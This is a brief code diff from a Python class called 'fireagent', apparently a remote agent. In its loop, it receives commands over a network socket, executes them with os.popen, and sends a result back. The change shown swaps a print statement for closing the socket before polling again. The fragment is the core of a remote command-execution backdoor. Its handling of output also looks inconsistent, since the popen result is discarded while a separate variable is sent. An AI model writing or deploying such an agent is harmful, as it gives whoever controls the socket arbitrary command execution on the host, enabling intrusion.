@@ -87,7 +87,7 @@ class fireagent:
 					command = serversocket.recv(1024)
 					os.popen(command.decode())
 					serversocket.sendall(bytes(commandResult, 'UTF-8'))
-					print(commandResult)
+				serversocket.close()
 				fireagent.agentPoll()
 
 fireagent.agentPoll()
